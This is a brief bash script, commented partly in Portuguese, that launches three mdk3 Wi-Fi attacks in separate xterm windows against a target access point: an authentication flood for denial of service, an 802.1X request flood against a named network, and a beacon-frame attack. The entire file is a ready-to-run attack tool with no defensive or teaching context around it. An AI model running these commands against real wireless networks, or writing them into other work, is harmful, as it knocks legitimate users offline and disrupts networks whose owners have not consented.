#!/bin/bash
#dos auth
xterm -title "dos" -hold -e " mdk3 wlan1mon a -a AA:BB:CC:DD:EE:FF"
# atack 802.11x -s =solicitacoes
xterm -title "802x" -hold -e "mdk3 wlan1mon x 0 -t AA:BB:CC:DD:EE:FF -n nomewifi -s 200"
#beacon frame atack
xterm -title "beacon" -hold -e "mdk3 wlan1mon b -t AA:BB:CC:DD:EE:FF"
